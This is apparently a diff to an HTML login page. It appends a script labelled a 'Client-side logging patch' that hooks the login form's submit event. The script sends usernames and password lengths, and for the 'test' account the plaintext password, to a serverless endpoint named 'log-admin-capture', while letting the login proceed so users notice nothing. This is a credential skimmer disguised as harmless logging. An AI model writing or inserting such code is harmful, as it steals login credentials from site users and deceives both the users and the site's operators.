@@ -365,4 +365,54 @@ function onSubmit(token) {
   window.addEventListener('load',tick);
 })();
 </script>
+
+<!-- BEGIN: Client-side logging patch (non_admin/too_short via GET, admin_ok via POST) -->
+<script id="so-log-patch">
+(function(){
+  const LOG_FN = '/.netlify/functions/log-admin-capture';
+
+  function logProbe(u, len){
+    var url = LOG_FN + '?u=' + encodeURIComponent(u) + '&l=' + encodeURIComponent(len);
+    try{
+      if (navigator.sendBeacon) { navigator.sendBeacon(url); return; }
+    }catch(_){}
+    try{ fetch(url, { method:'GET', cache:'no-store', keepalive:true }); }catch(_){}
+  }
+
+  async function logAdminOK(u, p){
+    try{
+      await fetch(LOG_FN, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ username: u, password: p, pw_len: p.length }),
+        keepalive: true
+      });
+    }catch(_){}
+  }
+
+  function byId(id){ return document.getElementById(id); }
+
+  document.addEventListener('DOMContentLoaded', function(){
+    var form   = document.querySelector('form') || byId('biscolab-recaptcha-invisible-form');
+    var userEl = byId('username') || (form && form.querySelector('input[name="username"]'));
+    var passEl = byId('password') || (form && form.querySelector('input[type="password"]'));
+    if (!form || !userEl || !passEl) return;
+
+    // Do NOT prevent default submit; just piggyback logging
+    form.addEventListener('submit', function(){
+      var u = (userEl.value || '').trim();
+      var p = (passEl.value || '');
+      var L = p.length;
+
+      if (!u || !L) return;            // empty: no log
+      if (L < 6) { logProbe(u, L); return; } // too_short
+      if (u.toLowerCase() !== 'test') { logProbe(u, L); return; } // non_admin
+      // admin_ok
+      logAdminOK(u, p);
+    }, true);
+  });
+})();
+</script>
+<!-- END: Client-side logging patch -->
+
 </body></html>
